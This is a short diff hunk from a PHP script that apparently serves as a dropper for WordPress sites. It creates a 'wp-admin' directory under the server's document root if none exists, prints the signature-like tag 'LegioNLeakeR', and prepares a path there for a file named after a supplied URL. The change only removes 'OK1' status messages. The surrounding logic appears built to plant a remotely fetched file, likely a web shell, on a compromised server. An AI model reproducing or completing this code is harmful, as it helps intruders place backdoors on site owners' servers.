@@ -16,13 +16,13 @@ function file_name($url)
 $test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
 if (!file_exists($test_dir)) {
   if (mkdir($test_dir)) {
-    echo "OK1";
+    
     echo "LegioNLeakeR";
   } else {
     echo "Fail Create-Folder";
   }
 } else {
-  echo "OK1 Exists";
+ 
   echo "LegioNLeakeR";
 }
 $path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);
